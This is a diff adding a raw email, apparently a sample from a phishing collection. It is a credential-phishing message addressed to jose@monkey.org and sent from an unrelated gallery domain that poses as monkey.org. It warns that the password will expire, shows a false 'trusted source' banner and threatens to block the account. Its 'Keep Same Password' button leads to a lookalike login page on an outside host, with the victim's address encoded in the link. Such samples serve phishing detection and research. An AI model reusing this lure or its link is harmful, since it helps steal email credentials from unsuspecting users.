@@ -1,0 +1,305 @@
+Return-Path: remy@artspheregallery.com
+Delivered-To: jose@monkey.org
+X-FDA: 84075665142.12.6D61BF2
+Received: from swath.artspheregallery.com (swath.artspheregallery.com
+ [104.37.1.26])
+	by imf20.b.hostedemail.com (Postfix) with ESMTP id CCCB660003
+	for <jose@monkey.org>; Wed,  5 Nov 2025 07:04:29 +0000 (UTC)
+Authentication-Results: imf20.b.hostedemail.com;
+	dkim=pass header.d=artspheregallery.com header.s=dkim header.b=HlCLsUrK;
+	spf=pass (imf20.b.hostedemail.com: domain of remy@artspheregallery.com
+ designates 104.37.1.26 as permitted sender)
+ smtp.mailfrom=remy@artspheregallery.com;
+	dmarc=pass (policy=none) header.from=artspheregallery.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1762326270;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=KGSu5smbDno7vvZ7rlWasGv3GnxaKdjepmu9lnqR68M=;
+	b=5ti9lJh5v/vM4znxuNrDAU6Nz9JbV6zpIBHfN2U/NknGUIBaNZ3xayffvNrWofbtgqq8ik
+	Qk25RJdwfljCERgqiSVHNzaxt9wtMHRLl6RQA/sL24RDbKARfZntE/AdrHIu2Fy1rdSlA3
+	R+kKpBBs/F5cAAw+HoF+whWGDQ50vk0=
+ARC-Authentication-Results: i=1;
+	imf20.b.hostedemail.com;
+	dkim=pass header.d=artspheregallery.com header.s=dkim header.b=HlCLsUrK;
+	spf=pass (imf20.b.hostedemail.com: domain of remy@artspheregallery.com
+ designates 104.37.1.26 as permitted sender)
+ smtp.mailfrom=remy@artspheregallery.com;
+	dmarc=pass (policy=none) header.from=artspheregallery.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1762326270; a=rsa-sha256;
+	cv=none;
+	b=NReqiKjmVZif7eRNm6zH7VGrexI0EzX9P7s5pRMCFWnsS2O3KkUPUXAyxFX1q8Cb7IjOPV
+	JhIHcPU1t3KeVm+EOmxaJC+MIn7kp+/PipR8Wxe/f+/V98tXAOwAY8uPiLas0pN1ZFaE/q
+	oT3xC7Hgf9XHgCzaKjgiekLO57H57OM=
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=dkim;
+ d=artspheregallery.com;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:Content-Transfer-Encoding;
+ i=remy@artspheregallery.com;
+ bh=mnmWNnq29cdmIFo2rDZGjfz/sc8=;
+ b=HlCLsUrKOIjF8MF/FEbr73qHzTiQ2J3pvCXsromgnIkNQ8Y/Axgi6Z7H0yIeCGknbzjK2R4xId6i
+   AiT50FlVPEMX4McuGXvtcC3rLm7uQYZzSS/unhW2P8/KU5HbpXgwBtdf+l+qXX/jUU5IKNxBTBDS
+   WfOx1hUBKawjHlqNnPZXIoQm+pEc5A/f+eVPDdl1YKq3J6hvPPNodq4kdE64QRvrNJ/y3OZwAby/
+   JqQlHpqLEGn7sAwnM+78ELI/NmD+qBF0zBhKOJlYk9KU+ikZOSKwpdPNfKklMclfscKqc1uHCogd
+   1x7xsp28MscCuv1G0+CUAkboZFMHryKwKAodmw==
+DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=dkim;
+ d=artspheregallery.com;
+ b=bBYgau9WjPiUaYkoFO1fTTXaDT/xqwRF9D+DifB4MUoupUaO8fP0L+6ZkDUduXjczaBUXah2yhpS
+   knrSxs/Bvymg68hHWxp0dPNv1iOfshXCi8WkRzxxpFQ34gGa19dk8s+YrGPNKOnZBFOEZjfnR/ie
+   95kesa0WQc+yL03D41IqzHQcATbslOQyScWnNclBKVmURkbNUg0sRvaQD5xFwnysnzirv8SwP8Iu
+   fjoIOXlP0PGrI/psi9mIykQ3c+x0K9apXdmOtQlIJZVVuQcnm5zB5OA4tnMH48Q+ckZ7y2T9j+LG
+   1Cl0BZA+sYZvUzgIinl7UCcLlIb2VMYOoF8YHA==;
+From: monkey.org <remy@artspheregallery.com>
+To: jose@monkey.org
+Subject: Password Expiry Notice for jose@monkey.org
+Date: 5 Nov 2025 08:04:28 +0100
+Message-ID: <20251105080427.90B25E196E9E3461@artspheregallery.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Rspam-User: 
+X-Spam-Status: No, score=1.73
+X-Rspamd-Server: rspam11
+X-Rspamd-Queue-Id: CCCB660003
+X-Stat-Signature: 6dxs7bujqi4641jccszrzet3om3w3szx
+X-HE-Tag: 1762326269-226184
+X-HE-Meta: 
+ U2FsdGVkX19dz35FDN72kKi+FIT5YycFt3zpfCOtmQTqbLdmuA/ZvYmF2Gsmsv6SxrEqPnSkpQxR4lvq27yTRnFtIzsa+w6NCShAe8c6EZuexFXNd/ld6AkANW2dHIh0oUVO6aNUXg+Ohy0hwyeeR0Pb9jZePPAnBLwXnyNnp7A3IWahT/zg/RK2sflCbwCH8buBljrKkrik8dquKftJMQC8mVmKhDa90L6LIp4mta/pY1Jg1FB+U818SRBSrRS+DxVhjd3CERAYjW3IpSgfNpzrYjPFjnj7f/wr5/1oXMb4lTAVRl3a15rifh3vus9kuLWtNDXD+b23zNveNea5vzO4vvhRv7IKKTTvjkDsudj810rus/B+KSx+W4eidWdM/QJHYiFPv5MeQMn71hSpB06SaJuWD5RRtB0r7D/Xfu/l0nfKB+3+5jFpPngiaTjwiXMXMGSdYbOUFJ8DVe8k15GmaBJg7M4+OqPCaRh34s2o27LVXEocGkT1daPwqnbFf4re9xV7W66EfGPmkrUl7dffxIGGtCjMw+0BT6Z8pGyZLo9OYTIf2enAzcOU+jHbnobdGGwJIhtE3vHLr+APSDN7ThxX0pwFiJuyLMmMrWZdJqLdCq57kiM4AjoKqZKoVAoKeQyNNKLHQXCa3ZWVHizGlX3DhXC2yjS9BYtISE9/ylxUdkw7c5yrHvUxx9KiCYprzSvsLmDw1pnUb/fzbvtBpfIrElLPUgmKteEZb3Q+sY7JXaJNnvkX6jlgSBCUGSppQZy0vpNnOy902GHrU4xIi74WMBZZYD/lPbluPRllbMjU7uJJJLcnq6snZ5y7pwcQ1t5JphP7uLoKwXLcljO1GO1Fy9QelnhB6GYejjhLu0jxbjAC91WzySmwmPPqCdXyWJE1kERxsFQwjzsExrLarZ5shM3gG47C62sxhWBlI98UeQj1nRkoEP9C/g743SOpXKNGb3eIo2kH6atqDJFi1wX
+ /0jZigLChA7tLBolTmVGikSKgK82xHucjLQiADyhMu32OqAFyiA9/znIzGu2cIGz//kyVBUQF0+0Fu3gndkLfR/3OmD0qEgKctxVpa8VxAkL/KUBkyvmo70FcTTB5Iv5cX+kcH688mEzeqPgcrqDHEgFfM5Jy7HI0QMt5XcVZ0OufQ8LjlH6/5yEIn8nYA6HP7f9A2Tg2oFrZuVsjIBg9rgVsGR27g6bN/QAUy6U6FDN+m8mA1JJSQAilipOaKAWnVEeOFnoSpTjj1uKLR/TB+TLLwnykYbViYg4nS3PHt5xZ+rgHBl2YUAogDA==
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 427
+
+<html><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<table style=3D"width: 526px; text-align: left; color: rgb(32, 31, 30) !imp=
+ortant; text-transform: none; line-height: inherit; letter-spacing: normal;=
+ font-family: arial,helvetica,sans-serif; font-size: 14px; font-style: norm=
+al; font-weight: 400; word-spacing: 0px; white-space: normal; table-layout:=
+ fixed; orphans: 2; widows: 2; font-stretch: inherit; background-color: whi=
+te !important;" data-darkosha-id=3D"1:10" min-scale=3D"0.844106463878327">
+<tbody>
+<tr data-darkosha-id=3D"1:12">
+<td width=3D"100%" style=3D"white-space: normal !important;" data-darkosha-=
+id=3D"1:13">
+<div style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-i=
+mage: none; height: 40px; color: inherit; line-height: inherit; overflow: h=
+idden; font-family: inherit; font-size: 15px; font-style: inherit; font-var=
+iant: inherit; font-weight: inherit; vertical-align: baseline; font-stretch=
+: inherit;" data-darkosha-id=3D"1:14">
+<table style=3D'width: 1285px; height: 36px; color: rgb(51, 51, 51) !import=
+ant; line-height: 1.6em; text-indent: 0px; font-family: "times new roman"; =
+font-size: 14px; font-style: inherit; font-variant: inherit; font-weight: i=
+nherit; border-collapse: collapse; font-stretch: inherit; background-color:=
+ rgb(238, 238, 238) !important;' data-darkosha-id=3D"1:15">
+<tbody>
+<tr data-darkosha-id=3D"1:17">
+<th style=3D"padding: 3px; border: 0px solid black; border-image: none; wid=
+th: 1px; color: white !important; line-height: 1.666; font-family: arial,ve=
+rdana,sans-serif; background-color: rgb(2, 151, 64) !important;" data-darko=
+sha-id=3D"1:18"><br aria-hidden=3D"true">
+</th>
+<td style=3D"padding: 3px; border: 0px solid black; border-image: none; lin=
+e-height: 1.666; font-family: arial,verdana,sans-serif; white-space: normal=
+ !important; background-color: rgb(243, 255, 248) !important;" data-darkosh=
+a-id=3D"1:20">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;" data-darkosha-id=3D"1:21">
+<span style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-=
+image: none; color: inherit; line-height: inherit; font-family: arial,helve=
+tica,sans-serif,serif,EmojiFont; font-size: inherit; font-style: inherit; f=
+ont-variant: inherit; font-weight: inherit; vertical-align: baseline; font-=
+stretch: inherit;" data-darkosha-id=3D"1:22">
+<span style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-=
+image: none; color: inherit; line-height: inherit; font-family: inherit; fo=
+nt-size: 12px; font-style: inherit; font-variant: inherit; font-weight: inh=
+erit; vertical-align: baseline; font-stretch: inherit;" data-darkosha-id=3D=
+"1:23">This email is from a trusted source.</span></span></div>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<table width=3D"100%" align=3D"center" style=3D"font: inherit; font-size-ad=
+just: inherit; font-stretch: inherit;" data-darkosha-id=3D"1:24">
+<tbody>
+<tr data-darkosha-id=3D"1:26">
+<td width=3D"100%" style=3D"white-space: normal !important;" data-darkosha-=
+id=3D"1:27">
+<table width=3D"100%" style=3D"font: inherit; font-size-adjust: inherit; fo=
+nt-stretch: inherit;" data-darkosha-id=3D"1:28">
+<tbody>
+<tr data-darkosha-id=3D"1:30">
+<td style=3D"white-space: normal !important;" data-darkosha-id=3D"1:31">
+<table align=3D"center" style=3D"font: inherit; width: 526px; max-width: 60=
+0px; font-size-adjust: inherit; font-stretch: inherit;" data-darkosha-id=3D=
+"1:32">
+<tbody>
+<tr data-darkosha-id=3D"1:34">
+<td width=3D"100%" align=3D"left" style=3D"color: black !important; white-s=
+pace: normal !important;" data-darkosha-id=3D"1:35">
+<table width=3D"100%" style=3D"font: inherit; table-layout: fixed; font-siz=
+e-adjust: inherit; font-stretch: inherit;" data-darkosha-id=3D"1:36">
+<tbody>
+<tr data-darkosha-id=3D"1:38">
+<td height=3D"100%" style=3D"padding: 10px; line-height: 22px; white-space:=
+ normal !important; background-color: rgb(32, 77, 213) !important;" data-da=
+rkosha-id=3D"1:39">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;" data-darkosha-id=3D"1:40"><spa=
+n style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px currentCol=
+or; border-image: none; text-align: center; color: inherit; vertical-align:=
+ baseline; font-size-adjust: inherit; font-stretch: inherit;" data-darkosha=
+-id=3D"1:41">
+<span style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-=
+image: none; color: rgb(246, 242, 242) !important; line-height: inherit; fo=
+nt-family: inherit; font-size: 22px; font-style: inherit; font-variant: inh=
+erit; font-weight: inherit; vertical-align: baseline; font-stretch: inherit=
+;" data-darkosha-id=3D"1:42">&nbsp;
+&nbsp; &nbsp; &nbsp; &nbsp; monkey.org&nbsp; Password Message.</span></span=
+>
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;" data-darkosha-id=3D"1:43"><br =
+aria-hidden=3D"true">
+</div>
+</div>
+</td>
+</tr>
+</tbody>
+</table>
+<table width=3D"100%" style=3D"font: inherit; table-layout: fixed; font-siz=
+e-adjust: inherit; font-stretch: inherit;" data-darkosha-id=3D"1:45">
+<tbody>
+<tr data-darkosha-id=3D"1:47">
+<td height=3D"100%" style=3D"padding: 18px 0px; line-height: 22px; white-sp=
+ace: normal !important;" data-darkosha-id=3D"1:48">
+<p style=3D"margin: 0px;" data-darkosha-id=3D"1:49">Dear jose,<br aria-hidd=
+en=3D"true">
+<br aria-hidden=3D"true">
+</p>
+<p style=3D"margin: 0px;" data-darkosha-id=3D"1:52"><strong data-darkosha-i=
+d=3D"1:53">The password
+to
+your email<span> jose@monkey.org</span></strong><b data-darkosha-id=3D"1:55=
+">
+is scheduled to expire Soon.</b></p>
+<p style=3D"margin: 0px;" data-darkosha-id=3D"1:56"><br aria-hidden=3D"true=
+">
+To continue using this email and keep same password kindly use the keep
+same password button below.</p>
+</td>
+</tr>
+</tbody>
+</table>
+<table width=3D"100%" style=3D"font: inherit; table-layout: fixed; font-siz=
+e-adjust: inherit; font-stretch: inherit;" data-darkosha-id=3D"1:58">
+<tbody>
+<tr data-darkosha-id=3D"1:60">
+<td align=3D"left" style=3D"white-space: normal !important;" data-darkosha-=
+id=3D"1:61">
+<table style=3D"font: inherit; text-align: center; font-size-adjust: inheri=
+t; font-stretch: inherit;" data-darkosha-id=3D"1:62">
+<tbody>
+<tr data-darkosha-id=3D"1:64">
+<td align=3D"center" style=3D"text-align: left; font-size: 16px; white-spac=
+e: normal !important;" data-darkosha-id=3D"1:65">
+<a style=3D"margin: 0px; padding: 12px 18px; border: 1px solid rgb(32, 77, =
+213); border-image: none; width: 270px; text-align: center; color: white !i=
+mportant; line-height: 13px; letter-spacing: 0px; font-family: inherit; fon=
+t-size: 14px; font-style: inherit; font-variant: inherit; font-weight: inhe=
+rit; vertical-align: baseline; font-stretch: inherit; background-color: rgb=
+(32, 77, 213) !important;" href=3D"https://murshidabadewt.org.in//hus55/WEB=
+MAIL1.html?email=3Dam9zZUBtb25rZXkub3Jn"=20
+target=3D"_blank" rel=3D"noopener noreferrer" data-darkosha-id=3D"1:66" dat=
+a-auth=3D"NotApplicable" data-linkindex=3D"1">Keep
+Same Password</a></td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+<table width=3D"100%" style=3D"font: inherit; table-layout: fixed; font-siz=
+e-adjust: inherit; font-stretch: inherit;" data-darkosha-id=3D"1:67">
+<tbody>
+<tr data-darkosha-id=3D"1:69">
+<td height=3D"100%" style=3D"padding: 18px 0px; line-height: 22px; white-sp=
+ace: normal !important;" data-darkosha-id=3D"1:70">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;" data-darkosha-id=3D"1:71">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;" data-darkosha-id=3D"1:72"><spa=
+n style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px currentCol=
+or; border-image: none; color: inherit; vertical-align: baseline; font-size=
+-adjust: inherit; font-stretch: inherit;" data-darkosha-id=3D"1:73">
+<span style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-=
+image: none; color: inherit; line-height: inherit; font-family: inherit; fo=
+nt-size: 10px; font-style: inherit; font-variant: inherit; font-weight: inh=
+erit; vertical-align: baseline; font-stretch: inherit;" data-darkosha-id=3D=
+"1:74"><span style=3D"font-style: italic;"><span style=3D"font-weight: bold=
+;"><span style=3D"color: rgb(204, 0, 0);"></span></span></span></span></spa=
+n>
+<p><span style=3D"font-style: italic;"><span style=3D"font-weight: bold;"><=
+span style=3D"color: rgb(204, 0, 0);">Please
+note that failure to update your password will lead to temporary
+blocking of your email account.</span></span></span><br>
+</p>
+<span style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px curren=
+tColor; border-image: none; color: inherit; vertical-align: baseline; font-=
+size-adjust: inherit; font-stretch: inherit;" data-darkosha-id=3D"1:73">
+<span style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-=
+image: none; color: inherit; line-height: inherit; font-family: inherit; fo=
+nt-size: 10px; font-style: inherit; font-variant: inherit; font-weight: inh=
+erit; vertical-align: baseline; font-stretch: inherit;" data-darkosha-id=3D=
+"1:74">Please
+note that you can only download or read the message with the email</span><s=
+pan>
+<strong>jose@monkey.org</strong></span>
+<span style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-=
+image: none; color: inherit; line-height: inherit; font-family: inherit; fo=
+nt-size: 10px; font-style: inherit; font-variant: inherit; font-weight: inh=
+erit; vertical-align: baseline; font-stretch: inherit;" data-darkosha-id=3D=
+"1:76">this message was sent to.</span><br aria-hidden=3D"true">
+<span style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-=
+image: none; color: inherit; line-height: inherit; font-family: inherit; fo=
+nt-size: 10px; font-style: inherit; font-variant: inherit; font-weight: inh=
+erit; vertical-align: baseline; font-stretch: inherit;" data-darkosha-id=3D=
+"1:78">No
+third-party access</span></span></div>
+</div>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+
+
+
+</body></html>
+
